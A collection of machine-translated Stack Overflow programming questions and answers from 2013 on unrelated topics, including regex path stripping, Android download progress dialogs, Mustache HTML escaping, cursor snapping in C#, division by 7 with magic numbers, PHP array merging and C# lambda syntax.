我需要一种在文档中插入代码的方法，而无需浏览器执行代码。是的，代码不一定必须在文本文件 (.txt) 中，我见过一些人在 a 中设置代码`<textarea>`，我喜欢这样。这个想法是不能修改源代码，我已经阅读了一些PHP解决方案，但我无法修改PHP。我尝试过使用 a`<pre>`和 a `<code>`，但是.. 不起作用，浏览器无论如何都会执行源代码，也许我不明白该标签的正确用法。

我读过有时需要替换一些特殊字符，例如`<`for `&#60;`，可能是问题所在吗？是否存在显示时不会影响最终结果的转换器？谢谢！我不知道我解释得好不好，我愿意接受任何建议（对不起，如果我听起来很奇怪，英语不是我的母语）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:24:12.740

使用 jQuery，您可以使用 AJAX 来获取包含源代码的文件，然后`.text(var_with_the_code)`在 jQuery 对象中使用 来显示 HTML 源代码，而无需“执行”它。

这是 jsFiddle 中的有限演示：http: [//jsfiddle.net/gberger/T3JDJ/](http://jsfiddle.net/gberger/T3JDJ/)

# regex - 删除 JSON 文件中部分文件名的正则表达式

> ID：15262452
> 
> 赞同：0
> 
> 时间：2013-03-07T03:16:21.933
> 
> 标签：regex, json

我有一系列执行路径作为 json 文件中的一个字段。文件中的每一行代表一条记录，文件的一行结构如下：

```
"2596192":[{"jobID":"2596192","account":"TG-MCB110136","user":"px","pkgT":{"mkl/10.0":{"libA":  
    ["libmkl_lapack.so"],"flavor":["default"]}},"startEpoch":"1338439337","runTime":"1337","execType":"use r:binary","exec":"/work/01779/plsawle/amber/amber10/bin/sander.MPI","numNodes":"1","sha1":"1f28c333d0f1534ffd8c67c26edff917d7980e48","execEpoch":1313768808,"execModify":"Fri Aug 19 10:46:48 2011","startTime":"Wed May 30 23:42:17 2012","numCores":"16","sizeT":{"bss":"82704936","text":"5722390","data":"489580"}}], 
```

如您所见，“exec”字段的执行路径是完全限定路径；但是，我想使用正则表达式来删除路径的开头，只保存他可执行文件的实际名称。例如，而不是...

```
 "exec":"/work/01779/plsawle/amber/amber10/bin/sander.MPI" 
```

我希望该领域是...

```
"exec":sander.MPI 
```

由于每个 exec 值的长度以及路径中“/”的数量都是任意的，因此我不确定如何构造正则表达式来进行这种转换。有人可以推荐一个解决方案吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:20:41.367

以下正则表达式将仅匹配可执行文件名称

```
[^/]+(?:\.\w+)?$ 
```

与 javascript 对象一起使用的示例

```
var obj = { exec : "/work/01779/plsawle/amber/amber10/bin/sander.MPI" };
var execName = obj.exec.match(/[^/]+(?:\.\w+)?$/i); 
```

**编辑**

我没有意识到你我们正在解析一个完整的 JSON 文件，你需要以下正则表达式

```
("exec":").+?([^/]+?(?:\.\w+)?") 
```

我不熟悉 textWrangler 但是通常你会用`$1$2`or替换`\1\2`。

如果您的文本编辑器支持带有环视（lookahead 和lookbehind 断言）的正则表达式，您可以使用以下正则表达式并替换为空字符串。

```
(?<="exec":").+?(?=[^/]+?(?:\.\w+)?") 
```

# java - 为什么 2.1.0 版本的 playframework 测试失败？

> ID：15262454
> 
> 赞同：2
> 
> 时间：2013-03-07T03:16:25.990
> 
> 标签：java, playframework, playframework-2.1

我正在尝试按照有关[播放框架](http://www.playframework.com/)的教程进行操作，但是当我到达运行测试的部分时，测试失败了。当我在浏览器中查看错误时，它说它找不到索引视图。我不确定为什么会这样。我猜他们在他们网站上的视频教程中使用的是旧版本。

如果你知道为什么最新版本（2.1.0）坏了，你能给我解释一下吗？

```
package controllers;

import play.*;
import play.mvc.*;
import views.html.*;

public class Application extends Controller {

    public static Result index() {
        return ok(index.render("Hello World."));
    }

} 
```

这是导致测试失败的文件。当我查看 IntelliJ 时，错误显示“无法解析符号索引”。

```
@Test
public void renderTemplate() {
    Content html = views.html.index.render("Hello World.");
    assertThat(contentType(html)).isEqualTo("text/html");
    assertThat(contentAsString(html)).contains("Your new application is ready.");
} 
```

这是 index.scala.html 文件中的代码

```
@(message: String)

@main("Welcome to Play 2.1") {

    @play20.welcome(message, style = "Java")

} 
```

这是失败的测试。如果我像这样删除索引，则返回 ok("Hello World."); 并对测试进行适当的调整，事情就会过去。但我想知道为什么他们一开始就失败了。特别是因为几乎所有东西都是开箱即用的。此外，事情运行没有错误。当我启动服务器时，我可以看到索引页面，但由于某种原因，当我尝试运行测试时，我被告知测试看不到索引文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T15:16:44.860

看起来像教程中的一个错误。测试似乎在寻找错误的字符串。尝试将最后一个资产更改为：

```
assertThat(contentAsString(html)).contains("Hello World."); 
```

# java - AsyncTask 在点击时关闭

> ID：15262457
> 
> 赞同：-2
> 
> 时间：2013-03-07T03:16:30.477
> 
> 标签：java, android, android-asynctask

这应该相当简单。当我使用 AsyncTask 下载文件时，如果您单击屏幕，则 ui 下载进度消失并且无法正确下载。即使按下屏幕，如何在屏幕上保持 ui 进度和下载？应该足够简单。

```
package com.cydeon.plasmamodz;

import com.stericson.RootTools.*;
import com.stericson.RootTools.exceptions.RootDeniedException;
import com.stericson.RootTools.execution.CommandCapture;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import java.util.concurrent.TimeoutException;

import com.cydeon.plasmamodz.R;

import android.app.ActionBar;
import android.app.Activity;
import android.app.DownloadManager;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

//Class for Boot Animation Blue Kindle
public class Boots extends Activity {

public static String TAG = "Boots";
Process process;

private class DownloadFile extends AsyncTask<String, Integer, String>{
    @Override
    protected String doInBackground(String... sURL) {
        try{
            URL url = new URL(sURL[0]);
            URLConnection connection = url.openConnection();
            connection.connect();
            //Shows 0-100% progress bar
            int fileLength = connection.getContentLength();

            //Download the file
            InputStream input = new BufferedInputStream(url.openStream());
            OutputStream output = new FileOutputStream("/sdcard/plasma/boot/b..ootanimation.zip");

            byte data[] = new byte[1024];
            long total = 0;
            int count;
            while ((count = input.read(data)) != -1) {
                total += count;
                //Publish the Progress
                publishProgress((int) (total * 100/fileLength));
                output.write(data, 0, count);
                }

            output.flush();
            output.close();
            input.close();
    } catch (Exception e) {

    }
    return null;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        mProgressDialog.show();
    }

    @Override
    protected void onProgressUpdate(Integer... progress){
        super.onProgressUpdate(progress);
        mProgressDialog.setProgress(progress[0]);

    }

    @Override
    protected void onPostExecute(String result) {
        // TODO Auto-generated method stub
        super.onPostExecute(result);
        mProgressDialog.dismiss();
        Context context = getApplicationContext();
        CharSequence text = "Installing. Please Wait";
        int duration = Toast.LENGTH_SHORT;

        Toast toast = Toast.makeText(context, text, duration);
        toast.show();

        if (RootTools.isBusyboxAvailable()){
            RootTools.remount("/system", "rw");
            CommandCapture command = new CommandCapture(0, "su", "sh /sdcard/plasma/scripts/boots.sh");
                try {
                    RootTools.getShell(true).add(command).waitForFinish();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (TimeoutException e) {
                    e.printStackTrace();
                } catch (RootDeniedException e) {
                    e.printStackTrace();
                }

        } else {
            RootTools.offerBusyBox(Boots.this);
        }

    }
}

ProgressDialog mProgressDialog;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.boots);
    ActionBar actionBar = getActionBar();
    actionBar.hide();
    ImageView img = (ImageView) findViewById(R.id.iv2);
    img.setImageResource(R.drawable.boot1);
    Button install = (Button) findViewById(R.id.bAInstall);
    Button rtrn = (Button) findViewById(R.id.bAReturn);
    mProgressDialog = new ProgressDialog(Boots.this);
    mProgressDialog.setMessage("Downloading..." );
    mProgressDialog.setIndeterminate(false);
    mProgressDialog.setMax(100);
    mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);

    install.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View arg0) {
            DownloadFile downloadFile = new DownloadFile();
            downloadFile.execute("http:\\correspondingurl");

            }

        }
    );

    rtrn.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View arg0) {
            finish();
        }
    });

    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:53:18.487

如果您只需要保持 ProgressDialog 从按下的屏幕事件中显示。只需将此代码添加到您的 ProgressDialog。

```
mProgressDialog.setCancelable(false); 
```

# mustache - Mustachejs 将 html 标记呈现为 html

> ID：15262459
> 
> 赞同：6
> 
> 时间：2013-03-07T03:16:36.123
> 
> 标签：mustache, html-rendering

我们正在使用 Mustachejs 转换旧的 CMS。内容的 BODY 包含一些 html 元素：

```
<strong>Mickey Mouse</strong> is a funny animal cartoon character created in 1928 by Walt Disney. 
```

我们将值应用于 Mustachejs，例如*{{Description}}*

呈现的输出是

```
<strong>Mickey Mouse</strong> is a funny animal cartoon character
created in 1928 by Walt Disney. 
```

Mustachejs 按字面意思显示数据库中的值。

我们如何让 Mustachejs 将 html 标记呈现为 html？

**期望的结果**

**米老鼠**是华特迪士尼于 1928 年创作的有趣的动物卡通人物。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-03-07T03:18:50.980

它并没有像在数据库中那样直接显示值，而是对其进行编码。它实际上在输出

```
&lt;strong&gt;Mickey Mouse&lt;/strong&gt; 
```

使用 {{{three_braces}}} 让 Mustache 渲染而无需对字符串进行 html 编码。*{{{描述}}}*

# c# - 如何在 MouseMove 之前知道鼠标的位置

> ID：15262467
> 
> 赞同：0
> 
> 时间：2013-03-07T03:17:30.660
> 
> 标签：c#, directx, mousemove, cursor-position, snap-to-grid

我正在尝试在我的应用程序中实现一项功能，以将光标捕捉到场景中的网格边缘。就目前而言，我确实有框架来获取当前**MouseMove**提供的**e.Location**并转换为我的世界坐标并返回屏幕 - 并且值匹配。请参阅下面的基本代码概述。

```
public void Scene_MouseMove(object sender, MouseEventArgs e)
{
    Vector2 world = ScreenToWorld(e.Location);

    ---> Check here to make sure the world coordinates returned
         fall inside my grid scene edges.
    if (world.X < Grid.Left) world.x = Grid.Left;

    Point target = WorldToScreen(world);

    // set cursr desired position
    Cursor.Position = (sender as PictureBox).PointToScreen( target );
} 
```

我遇到的问题是 MouseMove 在鼠标移动**之后**被调用，所以当我点击网格的边缘时，我看到鼠标过冲了一帧，然后自行纠正。当我移动鼠标时，这会导致光标在边缘抖动。我想这样做，所以当我击中边缘时，光标停止在其轨道上，但我不知道如何在鼠标移动之前捕获数据！

也许我正在解决这个错误，所以任何建议将不胜感激。

仅供参考 - 这是我尝试实现的 SnapToGrid 功能的第一部分。

**编辑：一个更简单的例子：**

您可以在下面运行简单示例时看到我的问题。请注意光标在您移动时如何在每一帧中闪烁？

```
bool g_Set = false;
public void Scene_MouseMove(object sender, MouseEventArgs e)
{
    // stop MouseMove from flooding the control recursively
    if(g_Set) { g_Set = false; return; }
    g_Set = true;
    Cursor.Position = new Point(400,400);
} 
```

C# 是否支持 API 中的任何内容以在实际移动 Cursor 之前捕获**MouseMove**，还是我应该只是研究实现我自己的 Cursor 类来隐藏**Form.Cursor**并只渲染我的（我需要研究的其他内容）也不知道该功能）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:35:43.250

要捕捉到边缘，请为捕捉留出一点空间，例如 2 个像素：

```
if (world.X - 2 < Grid.Left) world.x = Grid.Left; 
```

将光标限制在控件的矩形内，例如：aButton

```
Cursor.Clip = aButton.RectangleToScreen(aButton.ClientRectangle); 
```

释放光标：

```
Cursor.Clip = null; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:11:23.053

使用线性外推*计算*进入帧之前的最后一个像素。您需要两个点 P1 和 P2。进入前的点 P0 可以近似为

```
P0.X = P2.X - P1.X
P0.Y = P2.Y - P1.Y 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T14:59:46.360

你可以创建一个`UserControl`上面有一个场景的。将场景放在中心，周围有一个已知大小的边距。`UserControl.BackColor = Transparent`。_ 处理事件

```
private void UserControl_MouseMove(Object sender,MouseEventArgs e)
{
    // check if mouse is entering the Scene, you know the size of the margin
} 
```

从那里你可以想出逻辑来预测鼠标进入场景。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T19:43:31.833

因此，在研究了这一天之后，我最终崩溃了，写了一个 Cursor 类。这里重要的是我正在使用 Managed DirectX 在 PictureBox 中进行渲染，所以我有一条出路。

*实际上，我在System.Cursor*进入控件时隐藏了它，并通过在每帧之间获取 System.Cursor 的偏移量、应用我的逻辑并确定我想要渲染“我的”光标的位置来开始渲染我自己的光标。请参阅下面我如何处理偏移量：

```
public bool g_RecalcCursor = false;
public Point g_Reference = new Point(400,400);
public void SceneView_MouseMove(object sender, MouseEventArgs e)
{
    // this logic avoids recursive calls into MouseMove
    if (g_RecalcCursor)
    { 
        g_RecalcCursor = false;
        return;
    }

    Point ee = (sender as PictureBox).PointToScreen(e.Location);
    Point delta = new Point(g_Reference.X - ee.X, g_Reference.Y - ee.Y);

    //------------------------------------------//
    // I can use delta now to move my cursor    //
    // and apply logic "BEFORE" it renders      //
    //------------------------------------------//

    g_RecalcCursor = true;
    Cursor.Position = g_Reference;
} 
```

我很惊讶在鼠标移动（**MouseMoving** / **MouseMove** ）时没有像**Form_Closing** / **Form_Closed**这样的调用- 但话又说回来，*System.Cursor*可能不应该被应用程序操纵，以免恶化用户对它应该如何正常工作的体验，因此限制了 API 中的操作功能。

 ******我仍然愿意接受任何可以让我使用 System.Cursor 的建议......******

# javascript - jQuery UI Datepicker - 未捕获的类型错误：无法读取未定义的属性“msie”

> ID：15262468
> 
> 赞同：8
> 
> 时间：2013-03-07T03:17:40.850
> 
> 标签：javascript, jquery, wordpress, jquery-ui

我在 WordPress 中开发了一个网站并安装了 Gravity Forms 插件 ( [http://www.gravityforms.com/](http://www.gravityforms.com/) )。我已将在线图书表单添加到页面，但单击日期选择器时在控制台中返回以下错误：

未捕获的类型错误：无法读取未定义的属性“msie”

[http://ultimatepaintball.com.au/packages/book-online/](http://ultimatepaintball.com.au/packages/book-online/)

有没有人遇到过这个问题？我在某处读到它可能是 jQuery 1.9 和 $.browser 的问题，但即使我回退到 1.8.3，问题仍然存在。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:08:53.050

不确定，但我认为您将需要使用无冲突方法[http://api.jquery.com/jQuery.noConflict/](http://api.jquery.com/jQuery.noConflict/)

或者

将脚本上的所有`$`标志更改为`jQUery`

或者

```
(function( $ ) {
  $.fn.myPlugin = function() {
    // Do your awesome plugin stuff here
  };
})( jQuery ); 
```

或结合以上所有方法的某种方法。

你也可以在这个网站上搜索类似的问题：

[https://stackoverflow.com/search?q=jquery+conflict](https://stackoverflow.com/search?q=jquery+conflict)

# python - Flask/Python - 失去样式

> ID：15262470
> 
> 赞同：0
> 
> 时间：2013-03-07T03:17:49.083
> 
> 标签：python, flask

这是我第一次使用 S/O，所以如果我没有完全遵守发布规范，我深表歉意。

我的问题是使用 Python Flask，并创建一个需要多个参数的应用程序路由。

这是我的代码：

```
 @app.route('/edit/<title>/<chapter>/<section>', methods = ['GET', 'POST'])
     def edit_form(title, chapter, section):
          if request.method == 'GET':
               return render_template("edit/edit_form.html", title=title, chapter=chapter, section=section) 
```

这失去了我的风格。但是，如果我将 1 或 0 个参数传递给 edit_form，它会保持与我的其余模板相同的样式。发生了什么事，我该如何解决？

编辑：我设法找出问题 - 这是一个范围问题。我的 base.html 是这样编写的，它只会上升一个级别。但是，当我使用目录中的目录时，它将无法找到它不需要的文件夹。解决方法是创建一个不同的 base.html（或编辑原始 base.html 以提升多个级别，因为如果没有更高的目录，即使“..”在代码中，它也会停止上升。

# algorithm - 整数除以 7

> ID：15262472
> 
> 赞同：14
> 
> 时间：2013-03-07T03:18:22.110
> 
> 标签：algorithm, math, optimization, compiler-optimization, integer-division

来源我的答案：

[这个表达式在 C 预处理器中是否正确](https://stackoverflow.com/questions/15260644/is-this-expression-correct-in-c-preprocessor/15261439#15261439)

我在这里有点不擅长，我试图了解这种特殊优化是如何工作的。

如答案中所述，gcc 会将整数除以 7 优化为：

```
mov edx, -1840700269
mov eax, edi
imul    edx
lea eax, [rdx+rdi]
sar eax, 2
sar edi, 31
sub eax, edi 
```

将其转换回 C 为：

```
int32_t divideBySeven(int32_t num) {
    int32_t temp = ((int64_t)num * -015555555555) >> 32;
    temp = (temp + num) >> 2;
    return (temp - (num >> 31));
} 
```

我们来看看第一部分：

```
int32_t temp = ((int64_t)num * -015555555555) >> 32; 
```

为什么是这个数字？

好吧，让我们把 2^64 除以 7，看看会出现什么。

```
2^64 / 7 = 2635249153387078802.28571428571428571429 
```

看起来很乱，如果我们把它转换成八进制呢？

```
0222222222222222222222.22222222222222222222222 
```

这是一个非常重复的模式，这肯定不是巧合。我的意思是我们记得 7 是`0b111`，而且我们知道当我们除以 99 时，我们往往会得到以 10 为底的重复模式。因此，当我们除以 7 时，我们会在以 8 为基数的重复模式是有道理的。

那么我们的号码是从哪里来的呢？

`(int32_t)-1840700269`是相同的`(uint_32t)2454267027`

`* 7 = 17179869189`

最后 17179869184 是`2^34`

这意味着 17179869189 是 7 2^34 的最接近的倍数。或者换句话说，**2454267027 是适合的最大数字，`uint32_t`当乘以 7 时，它非常接近 2 的幂**

这个八进制数是多少？

```
0222222222223 
```

为什么这很重要？好吧，我们想除以 7。这个数字是 2^34/7... 大约。因此，如果我们乘以它，然后左移 34 次，我们应该得到一个非常接近确切数字的数字。

最后两行看起来像是为了修补近似误差而设计的。

也许在这个领域有更多知识和/或专业知识的人可以加入这一点。

```
>>> magic = 2454267027
>>> def div7(a):
...   if (int(magic * a >> 34) != a // 7):
...     return 0
...   return 1
... 
>>> for a in xrange(2**31, 2**32):
...   if (not div7(a)):
...     print "%s fails" % a
... 
```

故障从 3435973841 开始，有趣的是 0b11001100110011001100110011010001

对逼近失败的原因进行分类有点超出我的理解，以及补丁修复它的原因也是如此。有谁知道除了我在这里放下的魔法之外，魔法是如何运作的吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T04:47:05.837

算法的第一部分是乘以 7 的倒数的近似值。在这种情况下，我们用整数乘法和右位移来近似计算倒数。

首先，我们将值`-1840700269`（八进制`-015555555555`）视为 32 位整数。如果您将其读取为无符号 32 位整数，则它具有值`2454267027`（八进制`22222222223`）。事实证明，这`2454267027 / 2^34`是一个非常接近的整数近似`1/7`。

为什么我们选择这个数字和这个特殊的 2 幂？我们使用的整数越大，近似值越接近。在这种情况下，`2454267027`似乎是最大的整数（满足上述属性），您可以用它乘以有符号的 32 位 int 而不会溢出 64 位 int。

接下来，如果我们立即右移`>> 34`并将结果存储在 32 位 int 中，我们将失去两个最低位的准确性。这些位对于确定整数除法的正确下限是必需的。

我不确定第二行是否从 x86 代码中正确翻译。在这一点上，`temp`是大约`num * 4/7`，所以`num * 4/7 + num`位移会给你大约`num * 1/7 + num * 1/4`，一个相当大的错误。

例如，将 57 作为输入，其中`57 // 7 = 8`. 我也在代码中验证了以下内容：

*   `57 * 2454267027 = 139893220539`
*   `139893220539 >> 32 = 32`（大约`57 * 4/7 = 32.5714...`在这一点上）
*   `32 + 57 = 89`
*   `89 >> 2 = 22`（嗯？？现在还差得远`8`。）

无论如何，对于最后一行，这是我们在以这种方式计算有符号整数除法后所做的调整。我引用了 Hacker 对已签约部门的喜悦部分：

> 该代码最自然地计算了地板除法结果，因此我们需要进行更正以使其计算常规截断为 0 的结果。这可以通过三个计算指令来完成，如果被除数为负，则通过添加被除数。

在这种情况下（参考您的另一篇文章），您似乎正在做一个有符号的移位，所以它会`-1`在负数的情况下减去；给出 的结果`+1`。

这甚至不是你能做的全部；这是一篇更疯狂的[博客文章，介绍了如何通过一次乘法除以 7](http://blog.sigfpe.com/2010/05/optimising-pointer-subtraction-with-2.html)。

# java - 在集成测试中使用实时端点与使用模拟端点

> ID：15262473
> 
> 赞同：3
> 
> 时间：2013-03-07T03:18:23.767
> 
> 标签：java, testing, integration-testing

最近，我和我的同事一直在为一个 Java 项目编写集成测试。这些集成测试中的大多数都需要至少一个 SOAP Web 服务调用、LDAP 查询或其他依赖于我们不一定能够控制的端点的东西。其中一些 SOAP/LDAP 调用使用仍在开发中的库。

这最终意味着我们的集成测试有时会在构建过程中当机器停机、库更改或端点被更改时失败。在做了一些研究之后，我注意到人们在集成测试中使用实时端点似乎相当普遍，但我也发现了关于为什么使用实时端点可能有害的文章（[http://martinfowler.com/articles/nonDeterminism.html #远程服务](http://martinfowler.com/articles/nonDeterminism.html#RemoteServices)）。

我想知道在创建集成测试时什么更有意义：模拟所有端点，还是使用实时端点？似乎使用实时端点，尤其是在不可靠的情况下，会使测试变得不确定。但是，模拟似乎只能带您到此为止，并且您将无法测试在类似生产的环境中发生的情况。由纯模拟组成的集成测试对于验证除回归之外的任何内容是否有价值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T03:24:14.883

当你模拟和指向时，准确地模拟端点是非常重要的。如果您不这样做，您的测试可能会导致您错误地认为您可以正确地与服务集成。您正在使用不断变化的端点这一事实似乎使这变得困难。

无论您是在集成测试还是验收测试级别进行，您都应该有与真实端点交互的测试，否则您将不知道集成是否真的有效。

例如，在您的情况下，如果库更改或端点被更改并且您的测试失败，那实际上是集成失败，因此检测到这是一件好事。如果机器出现故障，您可以在测试中检测到它并将测试报告为跳过而不是失败。

所以在这种情况下，我会使用真实的服务来确保您的软件与第三方组件正确集成。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-03-18T11:52:10.657

您绝对应该尝试模拟您的端点。这样做有几个原因：

*   性能很重要，
*   对生产环境没有压力，或
*   如果检测到一些错误，为什么要破坏生产环境？

[您可以在此博客](http://intelligentbee.com/blog/2016/01/06/how-to-mock-endpoints-in-automated-acceptance-tests/)中找到有关此问题的更多信息。

# php - 如何合并具有相似键但仅一个键值不同的数组数组中的元素

> ID：15262474
> 
> 赞同：0
> 
> 时间：2013-03-07T03:18:28.393
> 
> 标签：php, arrays, function, loops, merge

我正在使用 PHP，并且有一个看起来像这样的数组数组：

```
Array(
    [0] => Array(
           [id]  =>1,
           [name]=>"edward",
           [asset]=>"somesong.mp3"
           ),
    [1] => Array(
           [id]  =>1,
           [name]=>"edward",
           [asset]=>"somemovie.mov"
           ),
    [2] => Array(
           [id]  =>2,
           [name]=>"sally",
           [asset]=>"anothersong.mp3"
           ),
    [3] => Array(
           [id]  =>2,
           [name]=>"sally",
           [asset]=>"anothermovie.mov"
           ),
...
) 
```

如您所见，它们是主数组中每个元素之间的相似之处，只是 [asset] 键的值不同。我想合并主数组中的元素，以便每个 [asset] 的两个值都保存在新元素中，就像这样

```
FinalArray(
    [0] => Array(
           [id]  =>1,
           [name]=>"edward",
           [song]=>"somesong.mp3",
           [movie]=>"somemovie.mov"
           ),
    [1] => Array(
           [id]  =>2,
           [name]=>"sally",
           [song]=>"anothersong.mp3",
           [movie]=>"anothermovie.mov"
           )
...
) 
```

我开始探索使用内部和外部`foreach()`循环的组合使用结构

```
// $person and $person02 are copies of the same array
foreach($person as $key=>$value){
    // grab an element in this loop
    $currElement=$person[$key];
    foreach($person2 as $key2=>$value2){
        $currElement2=$person2[$key2];
        // compare $currElement to $currElement2
        if($currElement['id']==$currElement2['id']){
            // determine if [asset] is an mp3 or mov
            $currAsset2=$currElement2['asset'];
            $currAsset =$currElement['asset'];

            $ext = substr(strrchr($currAsset,'.'),1)
            if($ext=='mp3'){ 
                // then we have a song and should store it
                $song=$currAsset['asset'];
                $movie=$currAsset2['asset'];
            }else{
                //  switch sides if you like
                $song=$currAsset2['asset'];
                $movie=$currAsset['asset'];
            }
        }

        // create a new array and add it to the result array
        $newArrEl = array(
            'id'   =>$currElement['id'],
            'name' =>$currElement['id'],
            'song' => $song,
            'movie' => $movie
        );
        $resultArray.push(); // add to final array
    }
}
} 
```

问题是，我探索了一堆 php 数组函数的组合，但似乎无法完全正确。所以我希望这里的人也可以帮助我解决这个问题。如何让原始数据与类似值合并到要添加到最终数组中的新元素中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:50:30.317

尝试这个 ：

```
$array = array(
    array(
        'id' => 1,
        'name' => 'edwards',
        'asset' => "somesong.mp3"
    ),
    array(
        'id' => 1,
        'name' => 'edwards',
        'asset' => "somemovie.mov"
    ),
    array(
        'id' => 2,
        'name' => 'sally',
        'asset' => "anothersong.mp3"
    ),
    array(
        'id' => 2,
        'name' => 'sally',
        'asset' => "anothermovie.mov"
    )
);

$res   = array();

foreach($array as $val){
   $res[$val['id']]['id'] =  $val['id'];
   $res[$val['id']]['name'] =  $val['name'];
   if(preg_match('/mp3$/',$val['asset'])){
    $res[$val['id']]['song'] =  $val['asset'];
   }
   if(preg_match('/mov$/',$val['asset'])){
    $res[$val['id']]['movie'] =  $val['asset'];
   }
}
$res  = array_values($res);

echo "<pre>";
print_r($res); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:26:36.143

看起来你的主要标识符是 id，我会用 id 作为键创建一个目标数组，并只遍历原始数组一次，如下所示：

```
<?php 

$original_array = array(
    array(
        'id' => 1,
        'name' => 'edwards',
        'asset' => "somesong.mp3"
    ),
    array(
        'id' => 1,
        'name' => 'edwards',
        'asset' => "somemovie.mov"
    ),
    array(
        'id' => 2,
        'name' => 'sally',
        'asset' => "anothersong.mp3"
    ),
    array(
        'id' => 2,
        'name' => 'sally',
        'asset' => "anothermovie.mov"
    )
);

$result = array();

$fields_map = array(
    '/\.mp3$/iS' => 'song',
    '/\.mov$/iS' => 'movie'
);

foreach($original_array as $item)
{
    $id = $item['id'];

    if (!isset($result[$id]))
    {
        // initial population
        $result[$id] = array(
            'id' => $id,
            'name' => $item['name']
        );
    }

    if (isset($item['asset']))
    {
        foreach($fields_map as $re => $field_name)
        {
            if (preg_match($re, $item['asset']))
            {
                $result[$id][$field_name] = $item['asset'];
                break;
            }
        }
    }
}

var_dump($result); 
```

注意：我对 field_map 使用正则表达式，而不是文件扩展名上的简单哈希图，因为我假设您可能需要更多扩展名来支持相同的字段（例如 mp3、ogg、wav、flac 所有映射到字段 'song '）。正则表达式使添加更多字段变得容易。

# c# - 为什么 lambda 需要 => 作为其语法的一部分？

> ID：15262476
> 
> 赞同：6
> 
> 时间：2013-03-07T03:18:29.497
> 
> 标签：c#, lambda

我在一本书中遇到了这行代码：

```
var data = db.Query(sql).OrderByDescending(c => c.DatePosted); 
```

这种事情对我来说似乎是在追尾......

**为什么**是`c => c.`必要的？以下内容不是可以理解的吗（编译器，甚至人类更是如此）？

```
var data = db.Query(sql).OrderByDescending(DatePosted); 
```

我敢肯定，在幕后发生了各种奇特的事情，据称**需要**这种奇怪的 lambda 语法，但又一次：

**为什么？**真的有必要吗？编译器不能确定 DatePosted 是排序的列吗？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-03-07T04:34:55.937

> ...为什么是`c => c.`必要的？以下内容不是可以理解的（编译器，甚至人类更是如此......

首先，如果您希望您的查询被人类阅读并省略 lambda，那么使用人类可读的语法编写您的查询并省略 lambda：

```
query = from record in records 
        orderby record.DatePosted descending
        select record; 
```

由于您陈述的原因，我更喜欢这种语法：它更易于阅读，并且强调*业务领域中查询的语义，*而不是*排序机制需要键选择功能这一事实。*

二`c=>c.`是*没有*必要。假设你有一个方法：

```
static DateTime DatePosted(Record record) { return record.DatePosted; } 
```

现在使用你想要的语法是完全合法的：

```
records.OrderByDescending(DatePosted) 
```

编译器将推断出`DatePosted`调用该函数以获取排序键并适当地构造委托。（请注意，它还将正确推断类型并计算出您的意思`OrderByDescending<Record, DateTime>`。）

更一般地说：C# 的基本设计原则是该语言不会猜测您的意思，除非在某些非常明确的情况下（*）。查询可以按字面意思进行排序，因此代码作者必须*清楚地*说明排序键是什么*。*在查询语法中，表示集合元素的范围变量可用，以便您可以轻松地表达“按与每条记录关联的日期排序”。仅仅说“按日期订购”将涉及猜测。

 *对于 lambda 语法，该方法需要一个选择顺序键的函数。您可以通过提供委托类型的值、可转换为委托类型的值的 lambda 或可转换为委托类型的值的方法组来提供所需的函数，只要您认为合适。“裸”属性不是函数。

那么， C# 语言是否*可以*被设计成当你提供一个属性的名称而没有任何上下文解释它的属性时，编译器会做出猜测？它说“哦，我看到这里有一个名为 OrderBy 的方法，它接受一个函数和一个序列，让我猜测为函数提供的名称旨在成为函数”从给定元素中获取此属性序列”？ *当然，我可以这样做。*代码编写起来并没有*那么*难。但这不符合 C# 语言的设计原则。节省几次击键的好处不值得痛苦违反了*代码中明确说明意图*的设计原则。

* * *

(*) Like implicitly typed locals, method type inference, implicitly typed arrays, and overload resolution, all of which involve the compiler making a best guess as to what the developer intended. The rules for making those guesses are carefully documented and have been designed so that most will bail out early if any ambiguity is detected.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-07T03:28:46.647

单独编写`DatePosted`可能会引用类型、字段、属性或方法组。如果它引用的方法组碰巧采用了正确类型的参数怎么办？那么这会做错事。

有时，直言不讳并不是一件坏事。语法

```
c => c.DatePosted 
```

专门表示接受输入并返回该输入的`DatePosted`字段/属性的函数。这很灵活——你可以写

```
c => DatePosted(c) 
```

或者

```
c => c.DatePosted() 
```

或者

```
c => new DatePosted(c) 
```

取决于你需要做什么。
